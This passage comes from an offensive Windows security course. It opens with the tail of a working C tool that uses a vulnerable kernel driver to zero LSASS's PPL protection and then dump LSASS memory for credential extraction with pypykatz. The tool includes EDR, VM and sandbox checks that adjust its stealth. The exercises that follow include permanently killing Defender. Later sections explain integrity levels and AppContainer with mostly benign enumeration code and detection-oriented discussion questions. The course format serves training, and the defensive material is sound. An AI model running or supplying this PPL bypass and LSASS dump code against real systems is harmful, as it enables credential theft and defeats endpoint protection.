        ULONG_PTR eprocess = current_entry - g_eprocess_offsets.ActiveProcessLinks;

        // Read the PID
        DWORD current_pid;
        if (!ReadKernelMemory(hDevice, driver_index,
                             eprocess + g_eprocess_offsets.UniqueProcessId,
                             &current_pid, sizeof(current_pid))) {
            break;
        }

        if (current_pid == pid) {
            printf("[+] Found EPROCESS for PID %d: 0x%llX\n", pid, eprocess);
            return eprocess;
        }

        // Move to next entry
        LIST_ENTRY next_entry;
        if (!ReadKernelMemory(hDevice, driver_index, current_entry, &next_entry, sizeof(next_entry))) {
            break;
        }

        current_entry = (ULONG_PTR)next_entry.Flink;

        // Safety check to prevent infinite loop
        if (current_entry == start_entry) {
            break;
        }

    } while (current_entry != start_entry);

    printf("[-] EPROCESS for PID %d not found\n", pid);
    return 0;
}

BOOL BypassPplProtection(HANDLE hDevice, int driver_index, DWORD lsass_pid) {
    printf("[*] Bypassing PPL protection for LSASS (PID %d)...\n", lsass_pid);

    // Find LSASS EPROCESS
    ULONG_PTR lsass_eprocess = FindEprocessByPid(hDevice, driver_index, lsass_pid);
    if (lsass_eprocess == 0) {
        return FALSE;
    }

    // Read current protection - use ULONG_PTR to avoid truncation
    UCHAR current_protection;
    ULONG_PTR protection_offset = lsass_eprocess + g_eprocess_offsets.Protection;

    if (!ReadKernelMemory(hDevice, driver_index, protection_offset,
                          &current_protection, sizeof(current_protection))) {
        printf("[-] Failed to read current protection\n");
        return FALSE;
    }

    printf("[*] Current PPL protection: 0x%02X\n", current_protection);

    // Remove protection by writing 0
    UCHAR zero_protection = 0;
    printf("[*] Attempting kernel write...\n");

    if (!WriteKernelMemory(hDevice, driver_index, protection_offset,
                           &zero_protection, sizeof(zero_protection))) {
        printf("[-] Failed to remove PPL protection\n");
        return FALSE;
    }

    printf("[+] PPL protection removed successfully\n");

    // Verify protection was removed
    UCHAR verify_protection;
    if (ReadKernelMemory(hDevice, driver_index, protection_offset,
                        &verify_protection, sizeof(verify_protection))) {
        printf("[*] Verification - New protection: 0x%02X\n", verify_protection);

        if (verify_protection != 0) {
            printf("[!] WARNING: Protection value is not 0 - write may have failed\n");
            return FALSE;
        }
    }

    return TRUE;
}

// Fast direct memory dump - bypasses MiniDumpWriteDump overhead
BOOL FastDumpLsass(DWORD lsass_pid, const char* output_path) {
    printf("[*] Fast-dumping LSASS memory to %s...\n", output_path);

    // Open LSASS with full access
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (hLsass == NULL) {
        printf("[-] Failed to open LSASS: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened LSASS with PROCESS_ALL_ACCESS\n");

    // Query memory regions
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T address = 0;
    SIZE_T total_dumped = 0;
    DWORD start_time = GetTickCount();

    // Create dump file
    HANDLE hFile = CreateFileA(output_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dump file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    printf("[*] Scanning memory regions");

    // Allocate 1MB buffer for fast reads
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        printf("[-] Failed to allocate buffer\n");
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return FALSE;
    }

    int regions_dumped = 0;

    // Walk memory regions
    while (VirtualQueryEx(hLsass, (LPCVOID)address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        // Only dump committed, readable memory (skip guard pages, free regions)
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {

            SIZE_T bytes_read = 0;
            if (ReadProcessMemory(hLsass, (LPCVOID)address, buffer, mbi.RegionSize, &bytes_read)) {
                DWORD bytes_written = 0;
                WriteFile(hFile, buffer, (DWORD)bytes_read, &bytes_written, NULL);
                total_dumped += bytes_read;
                regions_dumped++;

                // Progress indicator every 10 regions
                if (regions_dumped % 10 == 0) {
                    printf(".");
                    fflush(stdout);
                }
            }
        }

        address += mbi.RegionSize;

        // Safety check - don't scan beyond user space
        if (address >= 0x7FFFFFFFFFFF) break;
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(hFile);
    CloseHandle(hLsass);

    DWORD elapsed = (GetTickCount() - start_time) / 1000;
    if (elapsed == 0) elapsed = 1; // Avoid division by zero

    printf("\n");
    printf("[+] Fast dump completed\n");
    printf("[*] Regions dumped: %d\n", regions_dumped);
    printf("[*] Total size: %.2f MB\n", total_dumped / (1024.0 * 1024.0));
    printf("[*] Time taken: %d seconds\n", elapsed);
    printf("[*] Dump speed: %.2f MB/s\n", (total_dumped / (1024.0 * 1024.0)) / elapsed);
    printf("\n[!] Note: This is a raw memory dump, not a minidump format\n");
    printf("[!] For credential extraction, use the standard MiniDumpWriteDump method\n");
    printf("[!] This fast method is for demonstration/comparison only\n");

    return TRUE;
}

// Standard minidump with progress callback
BOOL CALLBACK MiniDumpCallback(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    if (CallbackInput->CallbackType == ModuleCallback) {
        printf(".");
        fflush(stdout);
        return TRUE;
    }
    return TRUE;
}

BOOL DumpLsassMemory(DWORD lsass_pid, const char* output_path) {
    printf("[*] Dumping LSASS memory to %s...\n", output_path);

    // Open LSASS with full access
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (hLsass == NULL) {
        printf("[-] Failed to open LSASS: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened LSASS with PROCESS_ALL_ACCESS\n");

    // Create dump file
    HANDLE hFile = CreateFileA(output_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dump file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    printf("[*] Creating minidump (pypykatz-compatible format)");

    DWORD start_time = GetTickCount();

    // Use MiniDumpWithDataSegs - faster and sufficient for credentials
    MINIDUMP_TYPE dump_type = (MINIDUMP_TYPE)(
        MiniDumpWithDataSegs |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithProcessThreadData
    );

    MINIDUMP_CALLBACK_INFORMATION callback_info;
    callback_info.CallbackRoutine = MiniDumpCallback;
    callback_info.CallbackParam = NULL;

    BOOL success = MiniDumpWriteDump(
        hLsass, lsass_pid, hFile,
        dump_type,
        NULL, NULL, &callback_info
    );

    printf("\n");
    DWORD elapsed = (GetTickCount() - start_time) / 1000;
    if (elapsed == 0) elapsed = 1;

    if (success) {
        LARGE_INTEGER file_size;
        GetFileSizeEx(hFile, &file_size);

        printf("[+] LSASS dump created successfully\n");
        printf("[*] Dump size: %.2f MB\n", file_size.QuadPart / (1024.0 * 1024.0));
        printf("[*] Time taken: %d seconds\n", elapsed);
        printf("[*] Dump speed: %.2f MB/s\n",
               (file_size.QuadPart / (1024.0 * 1024.0)) / elapsed);
    } else {
        printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
    }

    CloseHandle(hFile);
    CloseHandle(hLsass);

    return success;
}

int main(int argc, char* argv[]) {
    printf("  PPL Bypass - Multi-Driver Support\n\n");

    // Initialize anti-analysis
    InitializeAntiAnalysis();

    if (g_anti_ctx.is_edr_present && g_anti_ctx.stealth_level < 3) {
        printf("[!] EDR detected - consider using higher stealth level\n");
    }

    // Enumerate vulnerable drivers
    EnumerateVulnerableDrivers();

    // Find a loaded vulnerable driver
    int driver_index = -1;
    for (int i = 0; i < DRIVER_COUNT; i++) {
        if (g_vulnerable_drivers[i].is_loaded) {
            driver_index = i;
            break;
        }
    }

    if (driver_index == -1) {
        printf("[-] No vulnerable drivers found\n");
        printf("[*] Consider loading a vulnerable driver first\n");
        return 1;
    }

    printf("[+] Using driver: %ls (CVE-%d)\n",
           g_vulnerable_drivers[driver_index].name,
           g_vulnerable_drivers[driver_index].cve_year);

    // Detect EPROCESS offsets
    if (!DetectEprocessOffsets()) {
        return 1;
    }

    // Open the vulnerable driver
    HANDLE hDevice = OpenVulnerableDriver(driver_index);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Find LSASS PID
    printf("[*] Finding LSASS process...\n");
    DWORD lsass_pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(snapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
                    lsass_pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe32));
        }
        CloseHandle(snapshot);
    }

    if (lsass_pid == 0) {
        printf("[-] LSASS process not found\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Found LSASS PID: %d\n", lsass_pid);

    // Bypass PPL protection
    if (!BypassPplProtection(hDevice, driver_index, lsass_pid)) {
        printf("[-] PPL bypass failed\n");
        CloseHandle(hDevice);
        return 1;
    }

    // Dump LSASS memory - use fast method in VMs
    char dump_path[MAX_PATH];
    sprintf_s(dump_path, sizeof(dump_path), "lsass_dump_%d.raw", lsass_pid);

    printf("\n[*] Dumping LSASS memory...\n");

    // Check if we're in a VM or sandbox
    if (g_anti_ctx.is_vm || g_anti_ctx.is_sandbox || g_anti_ctx.stealth_level >= 2) {
        printf("[*] VM/Sandbox detected - using fast raw dump method\n");
        printf("[!] MiniDumpWriteDump is extremely slow in VMs due to memory introspection\n");

        if (FastDumpLsass(lsass_pid, dump_path)) {
            printf("\n[+] PPL bypass completed successfully!\n");
            printf("[*] Raw dump saved to: %s\n", dump_path);
            if (g_anti_ctx.is_edr_present) {
                printf("\n[!] EDR was present - monitor for alerts\n");
            }
        } else {
            printf("[-] Fast dump failed\n");
            CloseHandle(hDevice);
            return 1;
        }
    } else {
        // Physical machine - try standard minidump
        printf("[*] Physical machine detected - using standard minidump\n");

        char minidump_path[MAX_PATH];
        sprintf_s(minidump_path, sizeof(minidump_path), "lsass_dump_%d.dmp", lsass_pid);

        HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
        if (!hLsass) {
            printf("[-] Failed to open LSASS: %d\n", GetLastError());
            CloseHandle(hDevice);
            return 1;
        }

        HANDLE hFile = CreateFileA(minidump_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to create dump file: %d\n", GetLastError());
            CloseHandle(hLsass);
            CloseHandle(hDevice);
            return 1;
        }

        MINIDUMP_TYPE dump_type = (MINIDUMP_TYPE)(
            MiniDumpWithDataSegs |
            MiniDumpWithHandleData |
            MiniDumpWithUnloadedModules |
            MiniDumpWithProcessThreadData
        );

        BOOL success = MiniDumpWriteDump(
            hLsass, lsass_pid, hFile,
            dump_type,
            NULL, NULL, NULL
        );

        CloseHandle(hFile);
        CloseHandle(hLsass);

        if (success) {
            printf("[+] Minidump completed successfully\n");
            printf("\n[+] PPL bypass completed successfully!\n");
            printf("[*] LSASS dump saved to: %s\n", minidump_path);
            printf("\n[*] Extract credentials with pypykatz:\n");
            printf("    pypykatz lsa minidump %s\n", minidump_path);
        } else {
            printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
            printf("[*] Falling back to fast raw dump...\n");

            if (FastDumpLsass(lsass_pid, dump_path)) {
                printf("\n[+] PPL bypass completed with raw dump!\n");
                printf("[*] Raw dump saved to: %s\n", dump_path);
            } else {
                printf("[-] All dump methods failed\n");
                CloseHandle(hDevice);
                return 1;
            }
        }
    }

    // Cleanup
    CloseHandle(hDevice);

    printf("\n[*] Operation completed - exiting cleanly\n");
    return 0;
}
```

### Practical Exercise

- actually read lsassdump and see if it works properly
- change dump method in method 2 to do a proper dump instead of a raw one
- instead of just killing defender(which windows restarts immediately) find out how to kill it completely
- use different drivers and try killing defender or dumping lsass

### Key Takeaways

- **PPL protects critical processes** from even admin-level tampering (SeDebugPrivilege is insufficient)
- **Signer levels create hierarchy** - higher signers can access lower (WinTcb > Windows > Lsa > Antimalware)
- **BYOVD (Bring Your Own Vulnerable Driver) is the primary bypass** - exploit signed drivers with kernel R/W primitives
- **Kernel memory access can clear EPROCESS.Protection** - strips PPL non-destructively
- **Multiple bypass tools exist**: PPLdump, PPLFault, mimidrv, or custom exploits using RTCore64/similar drivers
- **Both attack methods have tradeoffs**:
  - **Process termination** (BdApiUtil) - Simple but destructive, causes system crash if targeting LSASS
  - **EPROCESS patching** (RTCore64) - Complex but non-destructive, allows credential theft
- **Windows build matters** - EPROCESS offsets change between versions (use windbg or check [Vergilius Project](https://www.vergiliusproject.com/))
- **Driver blocklists exist** - Windows Defender and HVCI can block known vulnerable drivers, but new ones emerge constantly

### Discussion Questions

1. **Why doesn't Microsoft completely prevent PPL bypass?**
   - Kernel drivers have legitimate needs for process access (debugging, monitoring, security software)
   - Blocking all kernel memory access would break compatibility with hardware vendors and security tools
   - The real solution is HVCI/VBS which prevents unsigned/vulnerable drivers from loading
   - It's a cat-and-mouse game: Microsoft blocks known vulnerable drivers, attackers find new ones

2. **How would you detect PPL bypass attempts?**
   - Monitor for vulnerable driver loading (RTCore64.sys, BdApiUtil64.sys, etc.) via Sysmon Event ID 6
   - Detect LSASS handle opens with PROCESS_VM_READ from unexpected processes
   - Watch for EPROCESS.Protection field modifications via kernel callbacks (PsSetCreateProcessNotifyRoutineEx)
   - Alert on minidump creation of LSASS (Event ID 1000 in Application log)
   - Use EDR with kernel-mode components to monitor driver IOCTLs
   - Enable HVCI/Memory Integrity to prevent vulnerable driver loading entirely

3. **What's the risk/benefit of using kernel drivers for bypass?**
   - **Benefits**:
     - Bypasses all userland protections (PPL, hooks, monitoring)
     - Non-destructive credential theft possible
     - Works even with Secure Boot if driver is signed
   - **Risks**:
     - Kernel code can cause BSOD if buggy
     - Leaves forensic artifacts (driver files, registry keys, event logs)
     - Requires admin privileges to load drivers
     - Vulnerable drivers get blocklisted over time
     - HVCI prevents loading on modern systems

4. **How does PPL interact with Credential Guard?**
   - **PPL protects the LSASS process** from memory access
   - **Credential Guard isolates credentials** in a VTL1 (Virtual Trust Level 1) secure environment
   - Even if you bypass PPL and dump LSASS, Credential Guard means:
     - NTLM hashes are not in LSASS memory (stored in isolated LSAIso.exe in VTL1)
     - Kerberos tickets are protected
     - You get limited credential material
   - **Full bypass requires**: PPL bypass + Credential Guard bypass (VTL1 escape or hypervisor exploit)
   - **Defense in depth**: PPL is one layer, Credential Guard is another

5. **Could a future Windows version make PPL bypass impossible?**
   - **Unlikely to be "impossible"** but can be made much harder:
     - **HVCI (Hypervisor-Protected Code Integrity)** prevents unsigned/vulnerable drivers - this is the real solution
     - **Driver blocklists** updated regularly via Windows Defender
     - **Kernel patch protection** (PatchGuard) detects EPROCESS modifications
     - **Secure Kernel** (VBS) isolates critical operations from normal kernel
   - **However**:
     - Zero-day driver vulnerabilities will always exist
     - Firmware/hypervisor exploits can bypass all protections
     - Physical access attacks (DMA, cold boot) remain viable
   - **Best defense**: HVCI + Credential Guard + TPM + Secure Boot + regular patching

## Day 4: Sandbox, Integrity Level, and AppContainer

- **Goal**: Understand Windows sandboxing mechanisms - integrity levels, AppContainers, process attributes, and token-based restrictions.
- **Activities**:
  - _Reading_:
    - [Microsoft - Mandatory Integrity Control](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)
    - [Microsoft - AppContainer Isolation](https://learn.microsoft.com/en-us/windows/win32/secauthz/appcontainer-isolation)
    - [James Forshaw - Windows Security Internals](https://nostarch.com/windows-security-internals)
  - _Online Resources_:
    - [Chromium Sandbox Architecture](https://chromium.googlesource.com/chromium/src/+show/HEAD/docs/design/sandbox.md) - Real-world sandbox implementation
  - _Tool Setup_:
    - Process Explorer / Process Hacker (token inspection)
    - NtObjectManager PowerShell module (James Forshaw)
    - AccessChk (Sysinternals)
    - TokenViewer (from NtObjectManager)
  - _Exercise_:
    - Enumerate integrity levels of running processes
    - Create an AppContainer process and test its restrictions
    - Manipulate tokens to escalate privileges
    - Exploit process attribute inheritance for sandbox escape

Windows uses multiple layers of process isolation beyond the traditional user/admin boundary. This day teaches you to **understand and defeat** these isolation mechanisms.

### Context: Why Sandbox Bypass Matters

- **Browser exploitation**: Chrome/Edge renderer runs in AppContainer - need to escape it
- **Windows Store apps**: UWP apps run sandboxed - malware must break out
- **Integrity levels**: Low-IL processes can't write to Medium-IL objects - affects post-exploitation
- **Red team operations**: Understanding token manipulation is critical for lateral movement

### Deliverables

- [ ] Understand Windows integrity levels (Untrusted, Low, Medium, High, System)
- [ ] Analyze AppContainer capabilities and restrictions
- [ ] Implement token manipulation for privilege escalation
- [ ] Study process attribute exploitation techniques

### Windows Integrity Levels Deep Dive

```text
┌─────────────────────────────────────────────────────────────────┐
│               Windows Integrity Level Architecture              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  INTEGRITY LEVELS (Mandatory Labels):                           │
│  ─────────────────────────────────────                          │
│  System    (S-1-16-16384)  │ Services, kernel-mode              │
│  High      (S-1-16-12288)  │ Elevated admin processes           │
│  Medium    (S-1-16-8192)   │ Standard user processes            │
│  Low       (S-1-16-4096)   │ Browser renderers, temp folders    │
│  Untrusted (S-1-16-0)      │ Most restricted                    │
│                                                                 │
│  MANDATORY POLICY:                                              │
│  ─────────────────                                              │
│  No-Write-Up:   Lower IL cannot write to higher IL objects      │
│  No-Read-Up:    Lower IL cannot read higher IL objects          │
│  No-Execute-Up: Lower IL cannot execute higher IL binaries      │
│                                                                 │
│  DEFAULT POLICY: No-Write-Up only                               │
│  -> A Low-IL process CAN read Medium-IL files by default!       │
│                                                                 │
│  ATTACK IMPLICATIONS:                                           │
│  ─────────────────────                                          │
│  Low IL -> Medium IL:                                           │
│  ├── Can read files, registry (unless explicitly labeled)       │
│  ├── Cannot write to Medium-IL system locations (Windows, PF)   │
│  ├── CAN write to own user files (owner rights override IL)     │
│  ├── Can write to %LOCALAPPDATA%\Low, %TEMP%\Low                │
│  ├── Can communicate via COM, shared memory                     │
│  └── Can exploit higher-IL services listening on interfaces     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Integrity Level Enumeration

```c
// integrity_level_tool.c - Enumerate integrity levels
// Compile: cl src\integrity_level_tool.c  /Fe:bin\integrity_level_tool.exe advapi32.lib

#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <errno.h>

// Well-known integrity level SIDs
#define INTEGRITY_UNTRUSTED_SID  "S-1-16-0"
#define INTEGRITY_LOW_SID        "S-1-16-4096"
#define INTEGRITY_MEDIUM_SID     "S-1-16-8192"
#define INTEGRITY_HIGH_SID       "S-1-16-12288"
#define INTEGRITY_SYSTEM_SID     "S-1-16-16384"

const char* GetIntegrityLevelName(DWORD level) {
    switch (level) {
        case 0x0000: return "Untrusted";
        case 0x1000: return "Low";
        case 0x2000: return "Medium";
        case 0x2100: return "Medium Plus";
        case 0x3000: return "High";
        case 0x4000: return "System";
        case 0x5000: return "Protected Process";
        default:     return "Unknown";
    }
}

void GetProcessIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
        return;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);

    PTOKEN_MANDATORY_LABEL pLabel = (PTOKEN_MANDATORY_LABEL)malloc(dwSize);
    if (GetTokenInformation(hToken, TokenIntegrityLevel, pLabel, dwSize, &dwSize)) {
        DWORD integrityLevel = *GetSidSubAuthority(
            pLabel->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pLabel->Label.Sid) - 1)
        );

        printf("[+] Integrity Level: %s (0x%04X)\n",
               GetIntegrityLevelName(integrityLevel), integrityLevel);

        // Show the SID
        LPSTR sidString = NULL;
        ConvertSidToStringSidA(pLabel->Label.Sid, &sidString);
        printf("    SID: %s\n", sidString);
        LocalFree(sidString);
    }

    free(pLabel);
    CloseHandle(hToken);
}

BOOL TestIntegrityRestrictions(const char* label) {
    printf("\n[*] Testing %s Integrity Level restrictions:\n", label);

    // Test 1: Write to user profile
    printf("    [TEST] Write to %%USERPROFILE%%\\il_test.txt: ");
    FILE* f = fopen("C:\\Users\\dev\\il_test.txt", "w");
    if (f) {
        fprintf(f, "test from %s IL\n", label);
        fclose(f);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (errno: %d)\n", errno);
    }

    // Test 2: Write to registry
    printf("    [TEST] Write to HKCU\\Software\\ILTest: ");
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\ILTest", 0, NULL,
                                   REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, label, 0, REG_SZ, (BYTE*)label, strlen(label) + 1);
        RegCloseKey(hKey);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (error: %ld)\n", result);
    }

    // Test 3: Write to system location
    printf("    [TEST] Write to C:\\Windows\\il_test.txt: ");
    f = fopen("C:\\Windows\\il_test.txt", "w");
    if (f) {
        fprintf(f, "test\n");
        fclose(f);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (errno: %d)\n", errno);
    }

    // Test 4: Read from user profile
    printf("    [TEST] Read from %%USERPROFILE%%\\Desktop\\desktop.ini: ");
    f = fopen("C:\\Users\\dev\\Desktop\\desktop.ini", "r");
    if (f) {
        fclose(f);
        printf("SUCCESS\n");
    } else {
        printf("FAILED (errno: %d)\n", errno);
    }

    return TRUE;
}

BOOL SpawnLowIntegrityProcess(const char* cmdLine) {
    printf("[*] Spawning Low-IL process: %s\n", cmdLine);

    HANDLE hToken, hNewToken;
    PSID pLowSid = NULL;

    // Get current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY |
                          TOKEN_ADJUST_DEFAULT | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        printf("[-] OpenProcessToken failed\n");
        return FALSE;
    }

    // Duplicate token with all access rights
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                          TokenPrimary, &hNewToken)) {
        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Create Low integrity SID
    ConvertStringSidToSidA(INTEGRITY_LOW_SID, &pLowSid);

    // Set token integrity level to Low
    TOKEN_MANDATORY_LABEL label = {0};
    label.Label.Attributes = SE_GROUP_INTEGRITY;
    label.Label.Sid = pLowSid;

    if (!SetTokenInformation(hNewToken, TokenIntegrityLevel,
                             &label, sizeof(label) + GetLengthSid(pLowSid))) {
        printf("[-] SetTokenInformation failed\n");
        LocalFree(pLowSid);
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        return FALSE;
    }

    // Create process with low integrity token
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    char cmdBuf[MAX_PATH];
    strcpy(cmdBuf, cmdLine);

    if (CreateProcessAsUserA(hNewToken, NULL, cmdBuf, NULL, NULL,
                              FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] Low-IL process created, PID: %d\n", pi.dwProcessId);

        // Wait for process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
    }

    LocalFree(pLowSid);
    CloseHandle(hNewToken);
    CloseHandle(hToken);
    return TRUE;
}

int main() {
    // Check if we're being called for Low-IL test
    if (__argc > 1 && strcmp(__argv[1], "--low-il-test") == 0) {
        printf("\n[*] Running in Low-IL child process:\n");
        GetProcessIntegrityLevel(GetCurrentProcess());
        TestIntegrityRestrictions("Low");
        return 0;
    }

    printf("=== Integrity Level Analysis Tool ===\n\n");

    printf("[*] Current process:\n");
    GetProcessIntegrityLevel(GetCurrentProcess());

    // Test at Medium IL
    TestIntegrityRestrictions("Medium");

    printf("\n[*] Now testing at Low IL...\n");

    // Create a temporary test program that runs the same tests
    char testCmd[512];
    sprintf(testCmd, "\"%s\" --low-il-test", __argv[0]);

    SpawnLowIntegrityProcess(testCmd);

    printf("\n=== Summary ===\n");
    printf("Medium IL: Can write to user profile and registry\n");
    printf("Low IL:    Cannot write to Medium-IL user locations\n");
    printf("Both:      Cannot write to system locations (need elevation)\n");

    return 0;
}
```

**Compile and Run**

```bash
cd c:\Windows_Mitigations_Lab>
cl src\integrity_level_tool.c  /Fe:bin\integrity_level_tool.exe advapi32.lib
.\bin\integrity_level_tool.exe
```

### AppContainer Analysis

```c
// appcontainer_analysis.c - Analyze and test AppContainer isolation
// Compile: cl src\appcontainer_analysis.c  /Fe:bin\appcontainer_analysis.exe advapi32.lib userenv.lib ole32.lib

#include <windows.h>
#include <userenv.h>
#include <sddl.h>
#include <stdio.h>

/*
AppContainer Isolation:
═══════════════════════

AppContainer is a stronger sandbox than integrity levels.
Used by: Edge/Chrome renderers, Windows Store apps, sandboxed services.

Key restrictions:
- Processes get a unique AppContainer SID
- Cannot access most user resources by default
- Network access requires explicit capabilities
- File access limited to package-specific folders
- Registry access heavily restricted
- Cannot communicate freely with other processes

AppContainer capabilities:
- internetClient           - Outbound internet
- internetClientServer     - Internet + listen
- privateNetworkClientServer - LAN access
- documentsLibrary        - User documents
- picturesLibrary         - User pictures
- videosLibrary           - User videos
- removableStorage        - USB drives
- enterpriseAuthentication - Domain auth

ESCAPE VECTORS:
- Broker process exploitation (most common)
- Capability escalation via COM
- Kernel vulnerabilities (bypass all usermode sandboxing)
- Named object namespace leaks
- Shared section exploitation
*/

void EnumerateAppContainerProcesses() {
    printf("=== AppContainer Process Enumeration ===\n\n");

    printf("[*] To enumerate AppContainer processes:\n");
    printf("    Get-Process | ForEach-Object {\n");
    printf("        $token = (Get-NtToken -ProcessId $_.Id -Access Query);\n");
    printf("        if ($token.AppContainer) {\n");
    printf("            Write-Host \"$($_.Name) [PID: $($_.Id)] - AC: $($token.AppContainerSid)\"\n");
    printf("        }\n");
    printf("    }\n\n");

    printf("[*] Common AppContainer processes:\n");
    printf("    - msedge.exe (renderer)   - Edge browser tabs\n");
    printf("    - chrome.exe (renderer)   - Chrome browser tabs\n");
    printf("    - RuntimeBroker.exe       - UWP app broker\n");
    printf("    - SearchUI.exe            - Windows Search\n");
    printf("    - WindowsTerminal.exe     - Modern terminal\n");
}

BOOL CreateAppContainerProcess(const char* appName) {
    printf("\n[*] Creating AppContainer process: %s\n", appName);

    PSID pAppContainerSid = NULL;
    HRESULT hr;

    // Create AppContainer profile
    LPCWSTR containerName = L"TestAppContainer";
    LPCWSTR displayName = L"Test AppContainer";
    LPCWSTR description = L"Testing AppContainer isolation";

    hr = CreateAppContainerProfile(containerName, displayName,
                                    description, NULL, 0, &pAppContainerSid);

    if (FAILED(hr)) {
        if (hr == HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)) {
            printf("[*] AppContainer profile already exists, deriving SID\n");
            hr = DeriveAppContainerSidFromAppContainerName(containerName,
                                                            &pAppContainerSid);
        }
        if (FAILED(hr)) {
            printf("[-] Failed to create/derive AppContainer: 0x%lX\n", hr);
            return FALSE;
        }
    }

    // Print AppContainer SID
    LPWSTR sidString;
    ConvertSidToStringSidW(pAppContainerSid, &sidString);
    wprintf(L"[+] AppContainer SID: %s\n", sidString);
    LocalFree(sidString);

    // Set up security capabilities
    SECURITY_CAPABILITIES secCaps = {0};
    secCaps.AppContainerSid = pAppContainerSid;
    secCaps.CapabilityCount = 0;  // No capabilities = maximum restriction
    secCaps.Capabilities = NULL;

    // Create process in AppContainer
    STARTUPINFOEXW siEx = {0};
    siEx.StartupInfo.cb = sizeof(siEx);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attrSize);

    UpdateProcThreadAttribute(siEx.lpAttributeList, 0,
                              PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
                              &secCaps, sizeof(secCaps), NULL, NULL);

    PROCESS_INFORMATION pi = {0};
    WCHAR cmdLine[] = L"cmd.exe /k echo Running in AppContainer";

    if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                       EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                       NULL, NULL, &siEx.StartupInfo, &pi)) {
        printf("[+] AppContainer process created, PID: %d\n", pi.dwProcessId);
        printf("[*] Try accessing user files from that cmd.exe\n");
        printf("[*] Try: type %%USERPROFILE%%\\Desktop\\test.txt\n");
        printf("[*] Expected: Access denied\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
    }

    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    free(siEx.lpAttributeList);
    FreeSid(pAppContainerSid);

